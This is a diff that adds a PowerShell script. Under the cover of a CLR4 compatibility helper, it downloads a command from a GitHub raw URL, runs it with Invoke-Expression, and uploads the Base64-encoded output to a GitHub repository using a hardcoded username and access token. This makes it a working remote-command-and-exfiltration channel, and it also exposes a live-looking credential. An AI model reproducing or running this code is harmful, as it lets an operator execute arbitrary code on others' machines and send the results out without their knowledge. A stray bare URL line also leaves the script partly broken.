@@ -1,0 +1,207 @@
+function Invoke-CLR4PowerShellCommand {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory=$true)]
+        [ScriptBlock]
+        $ScriptBlock,
+       
+        [Parameter(ValueFromRemainingArguments=$true)]
+        [Alias('Args')]
+        [object[]]
+        $ArgumentList
+    )
+   
+    if ($PSVersionTable.CLRVersion.Major -eq 4) {
+        Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList
+        return
+    }
+
+    $RunActivationConfigPath = $Env:TEMP | Join-Path -ChildPath ([Guid]::NewGuid())
+    New-Item -Path $RunActivationConfigPath -ItemType Container | Out-Null
+@"
+<?xml version="1.0" encoding="utf-8" ?>
+<configuration>
+  <startup useLegacyV2RuntimeActivationPolicy="true">
+    <supportedRuntime version="v4.0"/>
+  </startup>
+</configuration>
+"@ | Set-Content -Path $RunActivationConfigPath\powershell.exe.activation_config -Encoding UTF8
+
+    $EnvVarName = 'COMPLUS_ApplicationMigrationRuntimeActivationConfigPath'
+    $EnvVarOld = [Environment]::GetEnvironmentVariable($EnvVarName)
+    [Environment]::SetEnvironmentVariable($EnvVarName, $RunActivationConfigPath)
+
+    try {
+        & powershell.exe -inputformat text -command $ScriptBlock -args $ArgumentList
+    } finally {
+        [Environment]::SetEnvironmentVariable($EnvVarName, $EnvVarOld)
+        $RunActivationConfigPath | Remove-Item -Recurse
+    }
+
+}
+
+$script_block = {
+
+Add-Type -TypeDefinition @"
+   public enum RestMethod
+   {
+      GET,
+      PUT,
+      POST,
+      DELETE
+   }
+"@
+
+Function ConvertTo-Json20 {
+        [CmdletBinding()]
+        Param(
+        [Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelinebyPropertyName=$True)]
+        [object]$item
+        )
+PROCESS {
+            add-type -assembly system.web.extensions
+            $ps_js=new-object system.web.script.serialization.javascriptSerializer
+            return $ps_js.Serialize($item)
+    }
+}
+
+Function ConvertFrom-Json20 {
+        [CmdletBinding()]
+        Param(
+        [Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelinebyPropertyName=$True)]
+        [object]$item
+        )
+PROCESS {
+        add-type -assembly system.web.extensions
+        $ps_js=new-object system.web.script.serialization.javascriptSerializer
+        return $ps_js.DeserializeObject($item)
+    }
+}
+
+Function Invoke-RestMethod20
+{
+    param
+    (
+        [Parameter(Mandatory=$true)]
+        [RestMethod]
+        $Method,
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [System.String]
+        $Uri,
+        [Parameter(Mandatory=$false)]
+        [object]
+        $Body,
+        [Parameter(Mandatory=$false)]
+        [System.string]
+        $User,
+        [Parameter(Mandatory=$false)]
+        [System.String]
+        $Password,
+        [Parameter(Mandatory=$false)]
+        [System.String]
+        $UserAgent,
+        [Parameter(Mandatory=$false)]
+        [switch]
+        $asJson,
+        [System.String]
+        $ContentType = 'application/json',
+        [Parameter(Mandatory=$false)]
+        [object]
+        $Headers
+    )
+    $webclient = New-Object System.Net.WebClient
+    $webclient.Headers.add("Content-Type", $ContentType)
+$webclient.Headers.add("KeepAlive", $false)
+
+    ##Extra Headers
+    if ($Headers -ne $null)
+    {
+        $webclient.Headers.Add($Headers)
+    }
+
+    ##Autentication
+    if ($user -ne $null -and $Password -ne $null)
+    {
+        $creds = New-Object System.Net.NetworkCredential($User,$Password);
+        $webclient.Credentials = $creds
+    }
+
+    ##User Agent
+    if ($UserAgent -ne $null)
+    {
+        $webclient.Headers.Add("user-agent", $UserAgent)
+    }
+
+    ##Get Response
+    Try
+    {
+        if ($Method -eq "GET")
+        {
+            $response = $webClient.DownloadString($Uri)
+        }
+        elseif ($Method -eq "PUT" -or $Method -eq "POST")
+        {
+            $response = $webClient.UploadString($Uri,$Method,$Body)
+        }
+    }
+
+    Catch
+    {
+        Write-host $_.Exception
+    }
+
+    ##Return Response
+    if ($asJson)
+    {
+        return $response
+    }
+    #$json_response = ConvertFrom-Json20 -item $response
+return $response
+}
+
+
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent","Mozilla/4.0+")       
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+$cmd = $wc.DownloadString("https://raw.githubusercontent.com/SaurabhAil/codesamples/master/FetchCommand")
+https://api.github.com/repos/SaurabhAil/codesamples/contents/NBK_PC_Output.txt
+$output = Invoke-Expression $cmd
+$Base64Output = [System.Convert]::ToBase64String([char[]]$Output.ToString());
+
+$Token = 'SaurabhAil:61c686dc65d086c6a9bdad14f8314a653fdd04d5'
+$Base64Token = [System.Convert]::ToBase64String([char[]]$Token);
+
+$Headers = new-object System.Collections.Specialized.NameValueCollection
+$headers.Add('Authorization', 'Basic {0}' -f $Base64Token)
+$headers.Add('User-Agent', 'Mozilla/4.0+')
+
+#$Headers = @{
+#    Authorization = 'Basic {0}' -f $Base64Token;
+#    };
+
+$body2 = "{`"content`":`""
+$body2 = $body2 + $Base64Output + "`",`"message`":`"shelloutput`"}"
+
+Write-Output "JSON Output is $body2"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+#Invoke-RestMethod20 -Headers $Headers -Uri https://api.github.com/repos/SaurabhAil/codesamples/contents/testPCoutput.txt -Body {message = "shelloutput",content = $Base64Output} -Method Put -asJson
+Invoke-RestMethod20 -Headers $Headers -Uri https://api.github.com/repos/SaurabhAil/codesamples/contents/NBK_PC_Output.txt -Body $body2 -Method Put -asJson
+
+}
+
+function Test-CLR4PowerShell {
+    $ScriptBlock = { $PSVersionTable.CLRVersion }
+    & $ScriptBlock
+    Invoke-CLR4PowerShellCommand -ScriptBlock $ScriptBlock
+    & $ScriptBlock
+
+    Invoke-CLR4PowerShellCommand -ScriptBlock $script_block
+}
+
+$ErrorActionPreference = 'Stop'
+Set-StrictMode -Version Latest
+
+Test-CLR4PowerShell
